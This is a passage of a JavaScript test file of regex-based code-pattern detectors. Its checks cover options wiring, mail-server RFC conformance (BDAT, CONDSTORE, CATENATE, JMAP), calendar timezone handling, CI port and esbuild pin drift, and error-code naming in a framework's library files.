    // `var cfg = validateOpts.applyDefaults(opts, DEFAULTS)` — the merged config
    // is the read surface. Capture every alias assigned from applyDefaults(
    // <ident>, ...) so a read through it counts (otherwise a genuinely-wired
    // knob reads as a false "never read" once its per-field validateOpts call —
    // which used to provide the opts.X literal — is folded into shape()).
    var aliasOf = Object.create(null);
    var aliasRe = /(\w+)\s*=\s*(?:validateOpts\s*\.\s*)?applyDefaults\s*\(\s*(\w+)\s*,/g;
    var aliasM;
    while ((aliasM = aliasRe.exec(content)) !== null) {
      var src = aliasM[2];
      (aliasOf[src] || (aliasOf[src] = [])).push(aliasM[1]);
    }
    callRe.lastIndex = 0;
    var m;
    while ((m = callRe.exec(content)) !== null) {
      var ident = m[1];
      var arr = m[2];
      var readIdents = [ident].concat(aliasOf[ident] || []);
      var identAlt = readIdents.join("|");
      // Keys this ident forwards to an upper consuming primitive.
      var forwardedKeys = Object.create(null);
      Object.keys(FORWARD_PRIMITIVES).forEach(function (prim) {
        if (new RegExp("\\b" + prim + "\\s*\\(\\s*" + ident + "\\b").test(content)) {
          FORWARD_PRIMITIVES[prim].forEach(function (fk) { forwardedKeys[fk] = true; });
        }
      });
      var keyRe = /["']([A-Za-z_$][\w$]*)["']/g;
      var km;
      while ((km = keyRe.exec(arr)) !== null) {
        var key = km[1];
        if (forwardedKeys[key]) continue;
        if (ALLOW[rel + "::" + ident + "." + key]) continue;
        var readRe = new RegExp(
          "\\b(?:" + identAlt + ")\\s*(?:\\.\\s*" + key + "\\b|\\[\\s*[\"']" + key + "[\"']\\s*\\])");
        if (!readRe.test(content)) {
          var lineNum = content.slice(0, m.index).split(/\r?\n/).length;
          bad.push({
            file: rel, line: lineNum,
            content: "validateOpts accepts \"" + key + "\" on `" + ident +
                     "` but the file never reads " + ident + "." + key +
                     " — wire the knob, de-advertise it, or ALLOW with a consumption cite",
          });
        }
      }
    }
  }
  bad = _filterMarkers(bad, "validateopts-key-never-read");
  _report("every validateOpts-accepted key is read in the same file " +
          "(v0.14.21 — an accepted-but-never-read key is an advertised knob " +
          "with no implementation; csp-report opts.audit shipped as a no-op)",
    bad);
}

// ---- Pattern: a shape-using function validates EVERY opt via the shape ----
//
// class: shape-file-inline-opts-validation
//
// v0.15.13 — validateOpts.shape is the single, mandatory-exhaustive, typed opts
// contract. Once a FUNCTION moves its opts validation into a shape() schema, a
// stray per-field validateOpts.<check>(opts.<k>, ...) call OUTSIDE the schema in
// that same function is a regression: that opt is either rejected by the
// exhaustive contract (if undeclared) or validated twice in two drift-prone
// places. Every per-field opts check belongs as a shape RULE — a function rule
// takes (v, label, errorClass, code, opts), so cross-field logic lives in the
// shape too. Function-scoped: a different (unmigrated) function validating its
// own opts inline is not a regression. The bulk validateOpts(opts, [...])
// allowlist and validateOpts.applyDefaults(opts, ...) are `(opts,` not `(opts.`.
function testShapeFactoriesValidateOnlyViaShape() {
  var files = _libFiles();
  var bad = [];
  var inlineSrc = "validateOpts\\.(?:requireNonEmptyString|optionalNonEmptyString|optionalBoolean|optionalPositiveInt|optionalPositiveFinite|optionalFiniteNonNegative|optionalFunction|optionalNonEmptyStringArray|optionalPlainObject|optionalPort)\\s*\\(\\s*opts\\.[A-Za-z_$]";
  var fnBoundaryRe = /^(?:async\s+)?function\s+[A-Za-z_$][\w$]*\s*\(/gm;
  for (var i = 0; i < files.length; i++) {
    var rel = _relPath(files[i]);
    if (rel === "lib/validate-opts.js") continue;
    var content;
    try { content = fs.readFileSync(files[i], "utf8"); }
    catch (_e) { continue; }
    if (content.indexOf("validateOpts.shape(") === -1) continue;
    var boundaries = [];
    fnBoundaryRe.lastIndex = 0;
    var fm;
    while ((fm = fnBoundaryRe.exec(content)) !== null) boundaries.push(fm.index);
    if (boundaries.length === 0) continue;
    boundaries.push(content.length);
    for (var s = 0; s < boundaries.length - 1; s++) {
      var seg = content.slice(boundaries[s], boundaries[s + 1]);
      if (seg.indexOf("validateOpts.shape(opts") === -1) continue;
      var segRe = new RegExp(inlineSrc, "g");
      var m;
      while ((m = segRe.exec(seg)) !== null) {
        var absIdx = boundaries[s] + m.index;
        var lineNum = content.slice(0, absIdx).split(/\r?\n/).length;
        bad.push({ file: rel, line: lineNum,
          content: "this function uses validateOpts.shape() but ALSO validates an opt inline (" +
                   m[0].slice(0, 50) + ") — move it into the shape (a function rule gets opts for cross-field)" });
      }
    }
  }
  bad = _filterMarkers(bad, "shape-file-inline-opts-validation");
  _report("a function using validateOpts.shape() validates EVERY opt via the shape " +
          "(no inline validateOpts.<check>(opts.<k>) in the same function — the shape is the " +
          "single exhaustive opts contract; a function rule gets opts for cross-field checks)", bad);
}

// ---- Pattern: b.fsm.define freezes without cloning ----
//
// class: fsm-define-no-clone-before-freeze
//
// v0.11.25 Codex P2: `Object.freeze({ states: definition.states })`
// freezes the OUTER object but the inner `states` reference is still
// the caller's mutable object — `definition.states.foo.onEnter = ...`
// silently changes every instance's behaviour. The fix deep-clones
// states + transitions before the freeze. Detector flags any code in
// `lib/fsm.js` that calls `Object.freeze({ ... states: definition.<x>
// ... })` (i.e. direct reference, no clone).
function testFsmDefineClonesBeforeFreeze() {
  var bad = [];
  var path = "lib/fsm.js";
  var content;
  try { content = fs.readFileSync(path, "utf8"); }
  catch (_e) { return; }
  // If the freeze block literally references `definition.states` or
  // `definition.transitions` in a value position, that's the bug.
  var lines = content.split(/\r?\n/);
  var inFreezeBlock = false;
  for (var i = 0; i < lines.length; i++) {
    var line = lines[i];
    if (/Object\.freeze\(\s*\{/.test(line)) inFreezeBlock = true;
    if (inFreezeBlock) {
      if (/(states|transitions)\s*:\s*definition\.(states|transitions)\b/.test(line)) {
        bad.push({ file: path, line: i + 1, content: line.trim() });
      }
      if (/\}\s*\)/.test(line)) inFreezeBlock = false;
    }
  }
  bad = _filterMarkers(bad, "fsm-define-no-clone-before-freeze");
  _report("b.fsm.define deep-clones states + transitions before Object.freeze " +
          "(v0.11.25 Codex P2 — caller-side mutation can't drift frozen runtime)",
    bad);
}

// ---- Pattern: mail-server BDAT/binary lineBuffer through UTF-8 string ----
//
// class: smtp-linebuffer-utf8-roundtrip
//
// v0.11.26 Codex P1: when a mail-server (submission / MX) keeps the
// line-buffer as a UTF-8 string, the BDAT / BINARYMIME / 8BITMIME path
// loses bytes — invalid UTF-8 sequences get replaced with U+FFFD, and
// binary attachments come out corrupted at the agent layer. The fix
// keeps the line-buffer as a Buffer; per-command parsing decodes only
// the line slice. Detector flags any mail-server*.js file that
// declares `var lineBuffer = ""` (string init) — the lineBuffer MUST
// be a Buffer.
function testMailServerLineBufferIsBuffer() {
  var bad = [];
  var files = _libFiles().filter(function (p) {
    return /lib\/mail-server-(submission|mx|imap|pop3|managesieve|jmap)\.js$/.test(_relPath(p));
  });
  for (var i = 0; i < files.length; i++) {
    var content;
    try { content = fs.readFileSync(files[i], "utf8"); }
    catch (_e) { continue; }
    var lines = content.split(/\r?\n/);
    for (var j = 0; j < lines.length; j++) {
      var line = lines[j];
      if (/^\s*(\/\/|\*)/.test(line)) continue;
      // Match `var lineBuffer = "";` — string initialisation.
      if (/\b(var|let|const)\s+lineBuffer\s*=\s*""/.test(line)) {
        bad.push({ file: _relPath(files[i]), line: j + 1, content: line.trim() });
      }
    }
  }
  bad = _filterMarkers(bad, "smtp-linebuffer-utf8-roundtrip");
  _report("mail-server line-buffer initialised as Buffer (not string) " +
          "(v0.11.26 Codex P1 — UTF-8 roundtrip corrupts binary BDAT / 8BITMIME payloads)",
    bad);
}

// ---- Pattern: BDAT LAST emits double 250 reply ----
//
// class: bdat-last-double-reply
//
// v0.11.26 Codex P1: when a BDAT chunk completes AND `isLast`, the
// per-chunk acknowledgement ("250 <N> octets received") MUST NOT be
// emitted alongside the finalize reply ("250 Message queued") — RFC
// 3030 §2.2 specifies one reply per BDAT command. Two replies
// desynchronise the client (the extra 250 gets consumed as the
// reply to the next command). Detector flags any code in mail-
// server-submission.js that calls `_writeReply(..., "250 ...
// octets received")` immediately before `_finalizeAcceptedBody(...,
// "BDAT")` without an intervening branch / return.
function testBdatLastSingleReply() {
  var bad = [];
  var path = "lib/mail-server-submission.js";
  var content;
  try { content = fs.readFileSync(path, "utf8"); }
  catch (_e) { return; }
  var lines = content.split(/\r?\n/);
  for (var i = 0; i < lines.length - 5; i++) {
    if (!/octets received/.test(lines[i])) continue;
    // Look ahead 5 lines for _finalizeAcceptedBody. Whichever pattern
    // we hit first decides: a branch line (`if (wasLast)` /
    // `if (isLast)` / `} else {`) means the two replies are on
    // different code paths (legal); a `_finalizeAcceptedBody(...,
    // "BDAT")` call BEFORE any branch means both reply-emitters run
    // on the same path — Codex's exact bug.
    for (var k = 1; k <= 5 && i + k < lines.length; k++) {
      var probe = lines[i + k];
      if (/\bif\s*\(\s*(wasLast|isLast)\b|}\s*else\s*\{/.test(probe)) break;
      if (/_finalizeAcceptedBody\s*\(.*BDAT/.test(probe)) {
        bad.push({
          file: path, line: i + 1,
          content: "250 octets received emitted before _finalizeAcceptedBody(BDAT) without branch",
        });
        break;
      }
    }
  }
  bad = _filterMarkers(bad, "bdat-last-double-reply");
  _report("BDAT LAST emits exactly one reply per command " +
          "(v0.11.26 Codex P1 — RFC 3030 §2.2 — double-250 desyncs client)",
    bad);
}

// ---- Pattern: CHANGEDSINCE / UNCHANGEDSINCE must engage CONDSTORE ----
//
// class: condstore-implicit-engage-missing
//
// v0.11.27 Codex P2: RFC 7162 §3.1.2 — any FETCH/STORE that carries a
// CHANGEDSINCE or UNCHANGEDSINCE modifier implicitly engages CONDSTORE
// for the session (and the server MUST emit MODSEQ in subsequent
// responses). Detector flags any `lib/mail-server-imap.js` code that
// parses `changedSince` / `unchangedSince` but does not write
// `state.enabledCondStore = true` in the same function.
function testCondstoreImplicitEngage() {
  var bad = [];
  var path = "lib/mail-server-imap.js";
  var content;
  try { content = fs.readFileSync(path, "utf8"); }
  catch (_e) { return; }
  // Find every function that parses a `changedSince` or
  // `unchangedSince` local — those handlers MUST also set
  // `state.enabledCondStore = true` somewhere in scope.
  var lines = content.split(/\r?\n/);
  var funcStart = -1;
  var funcSawParse = false;
  var funcSawEngage = false;
  for (var i = 0; i < lines.length; i += 1) {
    var line = lines[i];
    if (/^\s*function\s+_handle\w+/.test(line)) {
      // Close out previous function.
      if (funcSawParse && !funcSawEngage) {
        bad.push({
          file: path, line: funcStart + 1,
          content: "handler parses changedSince/unchangedSince but never sets state.enabledCondStore = true",
        });
      }
      funcStart = i;
      funcSawParse = false;
      funcSawEngage = false;
    }
    if (/\b(changedSince|unchangedSince)\s*=\s*(parseInt|usN|csN|\d)/.test(line)) {
      funcSawParse = true;
    }
    if (/state\.enabledCondStore\s*=\s*true/.test(line)) {
      funcSawEngage = true;
    }
  }
  if (funcSawParse && !funcSawEngage) {
    bad.push({
      file: path, line: funcStart + 1,
      content: "handler parses changedSince/unchangedSince but never sets state.enabledCondStore = true",
    });
  }
  bad = _filterMarkers(bad, "condstore-implicit-engage-missing");
  _report("IMAP handlers that parse CHANGEDSINCE / UNCHANGEDSINCE engage CONDSTORE " +
          "(v0.11.27 Codex P2 — RFC 7162 §3.1.2 implicit-enable semantics)",
    bad);
}

// ---- Pattern: CATENATE parts list must validate parens + preserve order ----
//
// class: catenate-parens-order
//
// v0.11.28 Codex P1 #1: a CATENATE handler that strips `(` from the
// start and an optional `)` from the end without first asserting BOTH
// were present can dispatch a truncated parts list to the backend
// (e.g. the IMAP literal-aware parser fires the handler as soon as
// the first literal is consumed, with the closing paren still on the
// wire). Refuse without a closing paren.
//
// v0.11.28 Codex P1 #2: the handler MUST walk the parts list LEFT-TO-
// RIGHT preserving the client-specified order. RFC 4469 CATENATE
// concatenates parts in sequence; reordering URLs ahead of TEXT
// literals produces a different message body than the client built.
//
// Detector flags any `lib/mail-server-imap.js` code that extracts
// `URL` parts via `match(/URL.../g)` ahead of TEXT-part collection
// without a left-to-right walker — the regex-collect-all-then-append
// shape is the exact bug.
function testCatenatePartsOrderPreserved() {
  var bad = [];
  var path = "lib/mail-server-imap.js";
  var content;
  try { content = fs.readFileSync(path, "utf8"); }
  catch (_e) { return; }
  // `partsBody.match(/URL.../gi)` followed by `parts.push({ kind: "TEXT"`
  // in the same function indicates the collect-URLs-then-TEXT pattern.
  if (/partsBody\.match\s*\(\s*\/URL/.test(content) &&
      /parts\.push\(\s*\{\s*kind\s*:\s*"TEXT"/.test(content)) {
    bad.push({
      file: path, line: 1,
      content: "URL parts extracted via .match()/g before sequential TEXT walk — order regression risk",
    });
  }
  // Closing-paren validation must guard the body slice. The acceptable
  // shape is `if (body[0] !== "(" || body[body.length - 1] !== ")")`.
  if (/CATENATE/.test(content) && !/!==\s*"\("\s*\|\|.*!==\s*"\)"/.test(content)) {
    bad.push({
      file: path, line: 1,
      content: "CATENATE handler does not validate ( ... ) parens before backend dispatch",
    });
  }
  bad = _filterMarkers(bad, "catenate-parens-order");
  _report("CATENATE handler validates parens + walks parts left-to-right " +
          "(v0.11.28 Codex P1 — RFC 4469 §3 order-preserving concatenation)",
    bad);
}

// ---- Pattern: JMAP EventSource ping=0 opt-out + interval in payload ----
//
// class: jmap-eventsource-ping-shape
//
// v0.11.29 Codex P1+P2 — RFC 8620 §7.3 specifies (a) `ping=0` is the
// explicit opt-out for the keepalive event channel (the server MUST
// NOT emit ping events when ping=0), and (b) ping payload carries
// `{ "interval": <N> }` so clients can detect interval drift +
// know whether the server clamped their requested value.
//
// Detector flags `lib/mail-server-jmap.js` if either property
// regresses: ping=0 not specially handled (re-clamped to default), OR
// ping payload still emits `data: {}` instead of carrying interval.
function testJmapEventSourcePingShape() {
  var bad = [];
  var path = "lib/mail-server-jmap.js";
  var content;
  try { content = fs.readFileSync(path, "utf8"); }
  catch (_e) { return; }
  if (/eventSourceHandler/.test(content)) {
    if (!/params\.ping\s*===\s*"0"/.test(content) && !/pingDisabled\s*=\s*true/.test(content)) {
      bad.push({
        file: path, line: 1,
        content: "eventSourceHandler missing `ping=0` opt-out — RFC 8620 §7.3",
      });
    }
    if (/event:\s*ping\\ndata:\s*\{\}\\n\\n/.test(content) ||
        /res\.write\("event: ping\\ndata: \{\}/.test(content)) {
      bad.push({
        file: path, line: 1,
        content: "eventSourceHandler emits empty ping payload — RFC 8620 §7.3 expects { interval: <N> }",
      });
    }
    if (!/interval\s*:\s*pingN/.test(content) && !/interval:\s*pingN/.test(content)) {
      bad.push({
        file: path, line: 1,
        content: "ping payload does not include `interval: pingN` — RFC 8620 §7.3",
      });
    }
  }
  bad = _filterMarkers(bad, "jmap-eventsource-ping-shape");
  _report("JMAP EventSource `ping=0` opt-out + payload carries `{interval:N}` " +
          "(v0.11.29 Codex P1+P2 — RFC 8620 §7.3)",
    bad);
}

// ---- Pattern: JMAP Id cap matches RFC 8620 §1.2 (255 octets) ----
//
// class: jmap-id-undersized-cap
//
// v0.11.30 Codex P1 — JMAP `Id` values are valid up to 255 octets per
// RFC 8620 §1.2 (`[A-Za-z0-9_-]`). The earlier blob handler regex
// `{1,64}` refused legitimate-shape accounts. Detector flags any
// `{1,64}` accountId / blobId / Id-shape regex in mail-server-jmap.js.
function testJmapIdNotUndersized() {
  var bad = [];
  var path = "lib/mail-server-jmap.js";
  var content;
  try { content = fs.readFileSync(path, "utf8"); }
  catch (_e) { return; }
  // Match `[A-Za-z0-9_-]{1,N}` where N < 255.
  var lines = content.split(/\r?\n/);
  for (var i = 0; i < lines.length; i += 1) {
    var line = lines[i];
    if (/^\s*(\/\/|\*)/.test(line)) continue;
    var m = line.match(/\[A-Za-z0-9[_\\-]+\]\{1,(\d+)\}/);                                             // allow:regex-no-length-cap — inspects code text, fixed length
    if (!m) continue;
    var n = parseInt(m[1], 10);
    if (isFinite(n) && n > 0 && n < 255) {                                                            // allow:raw-byte-literal — RFC 8620 §1.2 max Id length
      // accountId / blobId / Id-shape — only flag when the line
      // is in a JMAP-handler context (the regex appears alongside an
      // accountId / blobId identifier mention nearby).
      var window = (lines[i - 1] || "") + "\n" + line + "\n" + (lines[i + 1] || "");
      if (/accountId|blobId|jmap|JMAP/.test(window)) {
        bad.push({ file: path, line: i + 1, content: line.trim() });
      }
    }
  }
  bad = _filterMarkers(bad, "jmap-id-undersized-cap");
  _report("JMAP Id regex caps at RFC 8620 §1.2 255-octet limit (Codex P1 v0.11.30)",
    bad);
}

// ---- Pattern: URL-path-segment extraction must use bounded split ----
//
// class: url-path-unbounded-regex
//
// v0.11.30 CodeQL — `pathOnly.replace(/\/+$/, "")` runs an unbounded
// quantifier on uncontrolled `req.url`. Even when anchored, CodeQL
// flags the polynomial-regex risk class. The framework now wraps URL
// splitting in `_splitPathSegments` which (a) caps input length first
// and (b) walks the string via a single-pass charCodeAt loop, no
// regex. Detector flags any `pathOnly\.replace\(/\\/\+\$/` shape in
// mail-server-jmap.js / mail-server-imap.js — both listeners get the
// same scrutiny.
function testUrlPathBoundedSplit() {
  var bad = [];
  var files = [
    "lib/mail-server-jmap.js",
    "lib/mail-server-imap.js",
  ];
  for (var fi = 0; fi < files.length; fi += 1) {
    var content;
    try { content = fs.readFileSync(files[fi], "utf8"); }
    catch (_e) { continue; }
    var lines = content.split(/\r?\n/);
    for (var i = 0; i < lines.length; i += 1) {
      var line = lines[i];
      if (/^\s*(\/\/|\*)/.test(line)) continue;
      if (/\.replace\s*\(\s*\/\\?\/\+\$\//.test(line)) {
        bad.push({ file: files[fi], line: i + 1, content: line.trim() });
      }
    }
  }
  bad = _filterMarkers(bad, "url-path-unbounded-regex");
  _report("URL path-segment extraction goes through bounded `_splitPathSegments` " +
          "(v0.11.30 CodeQL — polynomial-regex risk on uncontrolled req.url)",
    bad);
}

// ---- Pattern: iCal UTC ↔ JSCalendar timezone round-trip ----
//
// class: calendar-utc-roundtrip-loss
//
// v0.11.31 Codex P1 #1 — fromIcal must recognise a UTC-suffix DTSTART
// (`...Z`) and set `timeZone: "Etc/UTC"` on the JSCalendar Event so
// the round-trip back through toIcal emits a `Z`-suffix DTSTART
// instead of floating local time (RFC 5545 §3.3.5 form 1).
function testCalendarUtcRoundtrip() {
  var bad = [];
  var path = "lib/calendar.js";
  var content;
  try { content = fs.readFileSync(path, "utf8"); }
  catch (_e) { return; }
  if (/_veventToJsCalEvent/.test(content)) {
    if (!/timeZone\s*=\s*"Etc\/UTC"/.test(content) && !/timeZone:\s*"Etc\/UTC"/.test(content)) {
      bad.push({ file: path, line: 1,
        content: "iCal UTC DTSTART (...Z) must map to JSCalendar timeZone='Etc/UTC' (RFC 8984 §1.4.4)" });
    }
  }
  if (/function\s+toIcal\b/.test(content)) {
    if (!/timeZone\s*===\s*"Etc\/UTC"|timeZone\s*===\s*"UTC"/.test(content)) {
      bad.push({ file: path, line: 1,
        content: "toIcal must check timeZone === 'Etc/UTC' to emit a Z-suffix DTSTART (RFC 5545 §3.3.5)" });
    }
  }
  bad = _filterMarkers(bad, "calendar-utc-roundtrip-loss");
  _report("b.calendar UTC ↔ JSCalendar timeZone round-trip preserves absolute-instant semantics " +
          "(v0.11.31 Codex P1 — RFC 8984 §1.4.4)",
    bad);
}

// v0.12.1 compliance posture coverage — every POSTURE_DEFAULTS key
// MUST be in KNOWN_POSTURES (else `b.compliance.set(posture)` refuses
// despite cascade config being wired) AND every KNOWN_POSTURES entry
// MUST have a REGIME_MAP record (else `b.compliance.describe(posture)`
// returns null and admin UI / audit reports render empty). The v0.12.1
// backfill closed 65 missing entries across both axes; this detector
// catches future drift the same shape.
function testCompliancePostureCoverage() {
  var bad = [];
  var content;
  try { content = fs.readFileSync("lib/compliance.js", "utf8"); }
  catch (_e) { return; }
  var lines = content.split(/\r?\n/);
  var inKnown = false, inDefaults = false, inRegime = false;
  var known = Object.create(null);
  var defaults = Object.create(null);
  var regime = Object.create(null);
  var knownLineOf = Object.create(null);
  var defaultsLineOf = Object.create(null);
  for (var i = 0; i < lines.length; i += 1) {
    var ln = lines[i];
    if (/^var KNOWN_POSTURES/.test(ln))   { inKnown = true; continue; }
    if (/^var POSTURE_DEFAULTS/.test(ln)) { inDefaults = true; continue; }
    if (/^var REGIME_MAP/.test(ln))       { inRegime = true; continue; }
    if (/^\]\);|^\}\);/.test(ln))         { inKnown = inDefaults = inRegime = false; continue; }
    var m = ln.match(/^\s*"([^"]+)"/);
    if (!m) continue;
    if (inKnown)    { known[m[1]] = true; knownLineOf[m[1]] = i + 1; }
    if (inDefaults) { defaults[m[1]] = true; defaultsLineOf[m[1]] = i + 1; }
    if (inRegime)   { regime[m[1]] = true; }
  }
  Object.keys(defaults).forEach(function (p) {
    if (!known[p]) {
      bad.push({ file: "lib/compliance.js", line: defaultsLineOf[p],
        content: "POSTURE_DEFAULTS[\"" + p + "\"] has no KNOWN_POSTURES entry — " +
                 "b.compliance.set(\"" + p + "\") will refuse even though cascade config is wired" });
    }
  });
  Object.keys(known).forEach(function (p) {
    if (!regime[p]) {
      bad.push({ file: "lib/compliance.js", line: knownLineOf[p],
        content: "KNOWN_POSTURES[\"" + p + "\"] has no REGIME_MAP record — " +
                 "b.compliance.describe(\"" + p + "\") returns null + admin UI renders empty" });
    }
  });
  bad = _filterMarkers(bad, "compliance-posture-coverage-drift");
  _report("b.compliance posture catalog coverage — KNOWN_POSTURES ⊇ POSTURE_DEFAULTS, REGIME_MAP ⊇ KNOWN_POSTURES " +
          "(v0.12.1 — prevent broken b.compliance.set() / null describe() drift)",
    bad);
}

// v0.11.44 wiki-port drift — the v0.11.40 port swap (8080 → 3008)
// missed .github/workflows/release-container.yml's post-publish smoke
// step. The wiki container builds for v0.11.40 / .42 / .43 all failed
// because the smoke curled localhost:8080 against a listener on 3008,
// so no image landed in GHCR for three patch releases. Detector
// catches any future port collision between examples/wiki and the
// container-build smoke workflow: if WIKI_PORT is set to X in
// examples/wiki/Dockerfile, the workflow's `-p host:container` map +
// curl host MUST also reference X.
// Internal working notes (planning documents, scratch output, session
// residue) and editor/tool atomic-write temp artifacts
// (<name>.tmp.<pid>.<hash>) live outside the repository — a tracked
// file under memory/, notes/, a .scratch* path, or a *.tmp.* name
// ships internal residue to everyone who clones the repo, and tmp
// copies under lib/ ship in the npm tarball (`files` publishes lib/
// wholesale). v0.14.22 removed a committed planning note; v0.14.23
// caught four committed editor temp copies pre-merge. This gate
// refuses any recurrence at commit time instead of at code review.
function testNoTrackedInternalNotes() {
  var out;
  try {
    // Local require mirrors the bootstrap wrapper at the top of this
    // file — child_process is only touched on the two paths that talk
    // to the host (re-exec + this git query).
    out = require("node:child_process").execFileSync(
      "git", ["ls-files", "memory", "notes", ".scratch", ".scratch-*", "*.tmp.*"],
      { stdio: ["ignore", "pipe", "ignore"] }
    ).toString().trim();
  } catch (_e) {
    // Not a git checkout (npm tarball / exported tree) — nothing to gate.
    return;
  }
  check("no tracked internal-notes or temp-artifact files (memory/ notes/ .scratch* *.tmp.*)" +
        (out ? " — found: " + out.split("\n").join(", ") : ""),
        out === "");
}

// The residency write gates exist only if they're actually wired —
// declareColumnResidency/assertColumnResidency shipped in v0.7.27
// advertising a write-time gate that no write path called for 7 minor
// versions. This gate pins the wiring: the local write methods run
// _assertLocalResidency, the external query/transaction paths run
// _assertRowResidency, and assertColumnResidency has a real lib/
// caller outside its own definition file.
function testResidencyGatesWired() {
  var dbq, edb;
  try {
    dbq = fs.readFileSync("lib/db-query.js", "utf8");
    edb = fs.readFileSync("lib/external-db.js", "utf8");
  } catch (_e) { return; }
  var localCalls = (dbq.match(/_assertLocalResidency\(this\._cryptoFieldKey\(\)/g) || []).length;
  check("db-query wires the local residency gate on insert AND update", localCalls >= 2);
  check("db-query wires the long-advertised assertColumnResidency",
        dbq.indexOf("assertColumnResidency(") !== -1);
  var extCalls = (edb.match(/_assertRowResidency\(sql,/g) || []).length;
  check("external-db wires the row residency gate on query AND transaction", extCalls >= 2);
  check("external-db replica reads honor the row tag",
        edb.indexOf("REPLICA_RESIDENCY_INCOMPATIBLE") !== -1);
}

function testWikiPortAgreesAcrossArtifacts() {
  var bad = [];
  var dockerfile;
  try { dockerfile = fs.readFileSync("examples/wiki/Dockerfile", "utf8"); }
  catch (_e) { return; }
  // Extract WIKI_PORT default from `ENV ... WIKI_PORT=<n>`.
  var dfMatch = /WIKI_PORT\s*=\s*(\d+)/.exec(dockerfile);
  if (!dfMatch) return;
  var wikiPort = dfMatch[1];
  var workflowPath = ".github/workflows/release-container.yml";
  var workflow;
  try { workflow = fs.readFileSync(workflowPath, "utf8"); }
  catch (_e) { return; }
  // The smoke step has `-p X:X` + `curl http://localhost:X/healthz`.
  // Both X's must equal the Dockerfile's WIKI_PORT.
  var workflowLines = workflow.split(/\r?\n/);
  for (var wli = 0; wli < workflowLines.length; wli += 1) {
    var line = workflowLines[wli];
    var portMap = /-p\s+(\d+):(\d+)/.exec(line);
    if (portMap && (portMap[1] !== wikiPort || portMap[2] !== wikiPort)) {
      bad.push({ file: workflowPath, line: wli + 1,
        content: "release-container.yml smoke `-p " + portMap[1] + ":" + portMap[2] +
                 "` doesn't match examples/wiki/Dockerfile WIKI_PORT=" + wikiPort });
    }
    var curlMatch = /localhost:(\d+)\/healthz/.exec(line);
    if (curlMatch && curlMatch[1] !== wikiPort) {
      bad.push({ file: workflowPath, line: wli + 1,
        content: "release-container.yml smoke curls localhost:" + curlMatch[1] +
                 " but examples/wiki/Dockerfile WIKI_PORT=" + wikiPort });
    }
  }
  bad = _filterMarkers(bad, "wiki-port-cross-artifact-drift");
  _report("wiki port agrees across examples/wiki/Dockerfile + release-container.yml smoke step " +
          "(v0.11.44 — prevent re-emergence of the v0.11.40 missed-port-bump silent-deploy failure)",
    bad);
}

// The esbuild dev-tool is pinned across artifacts that carry no lockfile to keep
// them in sync: package.json devDependencies (the version source-of-truth, also
// postject), ci.yml + npm-publish.yml's exact `npm install esbuild@<v>` for the
// SEA / bundler-output build, and scripts/esbuild-binary-pin.json's reviewed
// per-platform binary hashes (verified on disk by the bundler-output smoke
// gate). A bump that updates one and not the others is the v0.11.40 silent-drift
// class: ci.yml tested 0.28.0 while package.json declared 0.28.1, so CI verified
// an unreviewed version. The agreement + per-platform hash COMPLETENESS is owned
// by one shared checker (scripts/check-esbuild-pin.js), called here and by
// release.js regen so neither path can silently drift — a bump that forgets the
// reviewed hashes fails closed instead of degrading the smoke pin to a skip.
function testEsbuildPinAgreesAcrossArtifacts() {
  var checkEsbuildPin = require("../../scripts/check-esbuild-pin.js").checkEsbuildPin;
  var bad = _filterMarkers(checkEsbuildPin().violations, "esbuild-pin-cross-artifact-drift");
  _report("esbuild pin agrees across package.json devDep + ci.yml/npm-publish.yml install + " +
          "esbuild-binary-pin.json reviewed per-platform hashes (prevent a workflow / pin silently " +
          "drifting from the reviewed version)",
    bad);
}

// The test-detached-async-iife antipattern (scanScope: "test") covers *.test.js,
// but the legacy single-layer entry files (test/00-primitives.js …
// 50-integration.js) are required + run directly by smoke.js via _runLayer and
// are NOT in _testFiles(). A top-level `(async function () {...})()` there would
// have the same detached false-pass — the worker awaits mod.run / mod.groups,
// never a require-time IIFE — so scan those files for the same shape here. Scoped
// to the IIFE pattern ONLY (not the full test-discipline catalog): those files
// carry a separate, larger setTimeout-sleep cleanup that is its own task.
function testNoDetachedAsyncIifeInLegacyLayerFiles() {
  var bad = [];
  var entries;
  try { entries = fs.readdirSync(TEST_ROOT); }
  catch (_e) { entries = []; }
  for (var i = 0; i < entries.length; i++) {
    if (!/^[0-9]{2}-[\w-]+\.js$/.test(entries[i])) continue;
    var content;
    try { content = fs.readFileSync(path.join(TEST_ROOT, entries[i]), "utf8"); }
    catch (_e) { continue; }
    var lines = content.split(/\r?\n/);
    for (var j = 0; j < lines.length; j++) {
      if (/^\s*(\/\/|\*|\/\*)/.test(lines[j])) continue; // skip comment lines
      if (/^\(async\b/.test(lines[j])) {
        bad.push({ file: "test/" + entries[i], line: j + 1,
          content: "top-level `(async` IIFE — define `async function run()` + `module.exports = { run }` " +
                   "and invoke under `if (require.main === module)`; a detached async IIFE false-passes its " +
                   "post-await assertions (the worker awaits mod.run / mod.groups, not a require-time IIFE)" });
      }
    }
  }
  bad = _filterMarkers(bad, "test-detached-async-iife-legacy");
  _report("no detached top-level async IIFE in the legacy single-layer smoke entry files " +
          "(test/NN-*.js run via smoke.js _runLayer — an IIFE there false-passes like in a *.test.js)",
    bad);
}

// v1 — error codes are the operator-grep contract and must be
// `namespace/kebab-case`. The first string argument to `new XError(...)`
// and `XError.factory(...)` IS the code (defineClass constructor signature
// is (code, message, ...)). Two anti-patterns this locks out, both swept
// for v1: a bare UPPER_SNAKE code with no namespace (`"BAD_JSON"`), and a
// camelCase namespace segment (`"aiDp/..."`). Codes built through a
// `var _err = XError.factory` alias in not-yet-swept modules use the bare
// `_err("X")` call shape (no literal `.factory(` / `new XError(` at the
// site), so they are not matched here — they land in the v1.0 namespaced-
// error sweep. Node-native codes (ETIMEDOUT / ENOENT / ABORT) are set by
// assignment, not constructed via these literals, so they are untouched.
function testErrorCodesNamespacedKebab() {
  // Native error constructors (TypeError, RangeError, ...) take the MESSAGE
  // first, not a code — only framework defineClass errors are (code, msg).
  var NATIVE = { Error: 1, TypeError: 1, RangeError: 1, SyntaxError: 1,
    ReferenceError: 1, EvalError: 1, URIError: 1, AggregateError: 1, InternalError: 1 };
  var bad = [];
  var files = _libFiles();
  var re = /(?:new\s+(\w+Error)\(|(\w+)\.factory\()\s*"([^"]+)"/g;
  for (var fi = 0; fi < files.length; fi += 1) {
    var rel = _relPath(files[fi]);
    if (rel === "lib/framework-error.js") continue;   // the definition site
    var content;
    try { content = fs.readFileSync(files[fi], "utf8"); }
    catch (_e) { continue; }
    var lines = content.split(/\r?\n/);
    for (var li = 0; li < lines.length; li += 1) {
      var line = lines[li];
